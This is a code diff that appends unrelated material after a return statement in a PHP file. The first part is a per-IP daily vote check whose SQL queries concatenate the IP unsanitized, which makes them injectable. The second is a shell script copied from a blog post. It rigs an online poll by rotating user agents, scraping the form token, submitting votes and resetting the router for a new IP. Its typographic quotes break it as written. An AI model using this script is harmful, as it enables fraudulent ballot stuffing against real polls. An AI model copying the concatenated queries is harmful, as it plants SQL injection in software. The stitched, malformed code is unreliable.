@@ -466,3 +466,78 @@ echo $history;
 ##############################################################
 
 return \GuzzleHttp\json_encode($arrJSON);
+
+
+
+
+
+
+####################################################################
+#
+#	Daily voting system with IP
+#
+####################################################################
+
+
+//
+$sql = "SELECT COUNT(*) as rowCount FROM ".$this->_voterTable." WHERE ip='".$ip."' AND DATE(latestVoteDate) = CURDATE()";
+
+//
+$conn = mysqli_connect("localhost","my_user","my_password","my_db");
+$query = mysqli_query( $conn,  $sql );
+$data = mysqli_fetch_assoc( $query );
+
+if($data['rowCount'] > 0)
+{
+   die("You are not allowed to vote");
+}
+else
+{
+   // Show the voting page or partial
+}
+
+// update
+$sql = "UPDATE ".$this->_voterTable." SET latestVoteDate = CURDATE() WHERE ip = '" . $ip . "';";
+mysqli_query($conn, $sql);
+
+---------------------------------------------------------------------------------
+https://xrds.acm.org/blog/2013/12/how-to-hack-a-sketchy-e-voting-system/
+
+#!/bin/sh
+while [ 1 ]
+do
+    rm cookie.txt
+    agent=$(sort agents.txt -R | grep “Mozil\|Oper” | head -n 1)
+    wget \
+         –quiet \
+         -O form.html \
+         –keep-session-cookies –save-cookies=cookie.txt \
+         –referer=”http://foo.com/index.php?option=com_acepolls&view=poll&id=1:rock-poll” \
+         –user-agent=”$agent” \
+         “http://foo.com/index.php?option=com_acepolls&view=poll&id=1:rock-poll&Itemid=161”
+    token=$(grep “name=\”[0-9a-f]\{32\}\”” form.html | grep -o “[0-9a-f]\{32\}” 2>/dev/null)
+    if [ “” != “$token” ]; then
+    wget \
+         –quiet \
+         -O submit.html \
+         –keep-session-cookies –load-cookies=cookie.txt \
+         –post-data=”voteid=13&option=com_acepolls&task=vote&id=1&$token=1&task_button=Vote” \
+         –referer=”http://foo.com/index.php?option=com_acepolls&view=poll&id=1:rock-poll” \
+         –user-agent=”$agent” \
+         “http://foo.com/index.php?option=com_acepolls&view=polls&Itemid=161”
+    fi
+    success=$(grep -o “Thank you for voting!” submit.html 2>/dev/null)
+    if [ “” != “$success” ]
+         then success=”1″
+         else success=”0″
+    fi
+    wget -O routerresponse.html –post-data=”PPP_Disconnect=1&PPP_Connect=0″ “http://192.168.2.1/cgi-bin/statusprocess.exe”
+    sleep 3
+    dslon=””
+    while [ “” == “$dslon” ]
+    do
+         sleep 1
+         dslon=$(ping -c 1 195.251.251.19 | grep -o “1 packets” 2>/dev/null)
+    done
+    sleep 10
+done
